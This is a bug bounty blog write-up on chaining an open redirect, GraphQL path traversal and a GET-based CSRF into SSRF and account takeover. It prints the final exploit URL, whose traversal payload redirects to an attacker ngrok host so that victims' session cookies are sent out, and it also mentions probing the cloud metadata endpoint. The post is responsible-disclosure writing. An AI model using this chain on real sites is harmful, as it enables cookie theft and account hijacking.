---
layout: post
title: Watch your requests!
subtitle: Open redirection to account takeover
tags: [ssrf,bugbounty,ato,graphql]
---

Recently, while testing a web application, I discovered multiple vulnerabilities that on chaining together could have allowed anyone to take over the Victim account. The affected company name is interchanged with "target" for the sake of confidentiality. The blog would detail how these vulnerabilities were discovered, chained, and exploited.

# From “../” to open redirect:

After some initial testing and fuzzing on `https://target.com`, I soon found an open redirect issue. If we appended two */* at the beginning of the request `GET /api/..` we would get the following response.

~~~HTML
HTTP 1.1 301

....
Location: //api/..
....
~~~

This would redirect us to host- `'api'` with path `/..`

After some trial and error, I came up with the following exploit - https://target.com///google.com//, which would redirect the victim to google.com!

![open redirect-1](/assets/img/open-redir-to-ato/Open-redirect-2.PNG){: .mx-auto.d-block :}

Open redirections are usually low severity issues. I decided to dig deeper into the functionality of the website to chain this with any other vulnerability I might find.

# Path traversal in the wild:

While using the app as a user, with burp running in the background, I noticed that website made several requests to a GraphQL API with different queries. GraphQL is an API query language that requires only one endpoint to query and modify data. Several companies use GraphQL as an alternative to REST APIs. You may read more about GraphQL [here](https://graphql.org/)

I began analyzing each GraphQL request one by one to check any unusual behavior. A mutation query `GetAuthorizedApps` grabbed my attention. This query was used to test the connection of any third-party apps which were connected to the account using OAuth.

![graphql-1](/assets/img/open-redir-to-ato/Graphql-1.PNG){: .mx-auto.d-block :}

The functionality of the query itself wasn't much of an interest. What actually caught my eye was the `id` variable that was sent as a string instead of an Integer. My first assumption was that the value of this variable might be used to make a server-side request to an internal API for example - `http://localhost:8080/api/1/:ID`. I quickly appended a single quote *‘* in hope that the server to throw an error. And the response -

![graphql-2](/assets/img/open-redir-to-ato/Graphql-2.PNG){: .mx-auto.d-block :}


I was right! The server was indeed making requests on behalf of the user, not to any internal host, but the API endpoint available on the same web app. Now I checked if it was possible to use ‘../’ to traverse the endpoint path to the root of the website. Yes, It was possible. 

![graphql-3](/assets/img/open-redir-to-ato/Graphql-3.PNG){: .mx-auto.d-block :}

The root cause of this issue seems to be something in the URL resolving libraries that figures out the traversal before making the request.

# Path traversal + Open redirect = SSRF!

Let us first understand what actually happens under the hood-

The website uses REST endpoints to fetch, modify, and delete user data as well as a GraphQL endpoint, which acts as a proxy for the REST API. The Graph queries would make server-side requests, on behalf of the user, to various REST endpoints to grab and modify the data. For example the GraphQL query – 

~~~
{“query”:”query GetUser($id: ID!){\n GetUser(id: $id)\n}}”,”variables”:{“ID”:”12345”}}
~~~
would make an internal GET request to `https://target.com/api/user/12345` on behalf of the user.

So far, I had discovered an open redirect and a path traversal. It was now easy to perform a Server Side Request Forgery attack by chaining these two issues! I spun up a ngrok instance, an alternative to burp collaborator, for receiving the incoming request to confirm the issue. You’d have probably guessed by now how the final exploit chain looked like. Here’s mine –

![SSRF-1](/assets/img/open-redir-to-ato/SSRF-1.PNG){: .mx-auto.d-block :}

Since we already have an open redirection and a path traversal, the first 4 '../' would traverse the path up by 4 directories and the ///XXXXXXXX.ngrok.io// would cause a redirection to our server confirming the SSRF.

Here's the Request that I received was – 

![SSRF-2](/assets/img/open-redir-to-ato/ssrf-2.PNG){: .mx-auto.d-block :}


# Falling on the face

Awesome now we have an SSRF! The next obvious step was to fetch the cloud metadata of the AWS ec2 instance. I wrote a python script to create an Http Server and redirect every inbound request to http://169.254.169.254. I bound this script with the ngrok instance. This was important because the server only made requests to `https://` instead of `http://`, and the metadata is only accessible on port 80. Here’s the response.

![ssrf-exp-1](/assets/img/open-redir-to-ato/SSRF-exp-1.PNG){: .mx-auto.d-block :}

Bummer!! :(  I was unable to read the response! But why? Turns out that the server is expecting a JSON response with the objects success and key, instead of plain or HTML for all the 200 OK requests and threw an error if the status code wasn't 2XX.This error would return the whole response of the proxy request.

I could still map the internal network by making requests to the internal host but this would drop the severity of the issue to medium as only errors were readable. After some more digging, I found a way to escalate it further to a much higher severity issue.

# Gotcha!

Remember the request we got on our ngrok after exploiting the SSRF? Let's take a look at it once again.

![ssrf-2-cookie](/assets/img/open-redir-to-ato/ssrf-2-cookie.PNG){: .mx-auto.d-block :}

Notice the cookie header which that sent along with the request. I soon realized that these were my session cookies! This was how the server was authenticating requests made on behalf of the user. However, this discovery was useless unless we could somehow force our victims to make this request and receive their cookies on our server.

My initial idea was to find an XSS, bypass the Same Origin Policy, make the malicious GraphQL request on behalf of the victim, and then exfiltrate the cookies.


After spending a day looking for an XSS vulnerability, I didn't find any and gave up. I reported this as a Blind SSRF with the ability to read a partial response and began testing other parts of the app.

I noticed another query "ZtsplXXXXXXX" whose behavior was very similar to `GetAuthorized` query because this query used an ID variable to make internal requests too! 

![ssrf-exp-2](/assets/img/open-redir-to-ato/SSRF-exp-2.png)

However, there is one major difference between the two. `GetAuthorized` was a _mutation_ query while `ZtsplXXXXXXX` was a normal query. As soon as I saw this, I knew I've got a complete account takeover.

The GraphQL endpoint was running on [Apollo](https://www.apollographql.com) server. This was exciting because according to its [docs](https://www.apollographql.com/docs/apollo-server/v1/requests/), the Apollo server also accepts `GET` requests! 

An example query in GET request would look like:-

~~~
GET /graphql?query=query aTest($arg1: String!) {test(who: $arg1) }&operationName=aTest&variables={"arg1":"me"}
~~~

But there's a limitation.`mutation` queries cannot be executed via *GET* requests, only normal queries are allowed. We can use this "feature" to our advantage by using the query "ZtSpXXXXXXXXX" as a CSRF for our chain!


# The "Hack"

So far we got 
-	An open redirect
-	A Path traversal
-	A CSRF

Let's chain them together for our final exploit to grab the victim's cookie header!

~~~HTML
https://target.com/api/graphql/v2?query=query ZtSpXXXXXXXXX($id: ID!) {  XXXXXXXX(id: $id) {    title    steps    headService {      id      name      __typename    }    tailService {      id      name      __typename    }    services {      id      name      __typename    }    __typename  }}&variables={"id":"1234/../../../../../..///xxxxxxx.ngrok.io//"}
~~~

As soon as the victim clicks the above link, their session cookies would be sent to our ngrok server, which we can later use to access their account!

![ato-exp-1](/assets/img/open-redir-to-ato/ATO-exp-1.PNG)

These issues were responsibly reported to the affected company. The open redirect was fix by dissallowing root redirects. The server also now denies to send the cookies to non whitelisted domains for the requests made server side.

# Timeline

- Aug 29, 2020 - Initial discovery of open redirect and path traversal
- Aug 30, 2020 - Vulnerability escalated and updated the report as account takeover issue
- Sep 18, 2020 - Fixes pushed by the team and bounty awarded as critical

**Shoutout to [@y_sodha](https://twitter.com/y_sodha) for proofreading!**

<h5>Liked the article, have a question about the post or just wanna chat? Feel free to reach out to me on <a href ="https://twitter.com/surajdisoja">twitter</a> or send me an email at <a href="mailto:hello@surajdisoja.me">hello@surajdisoja.me</a></h5>
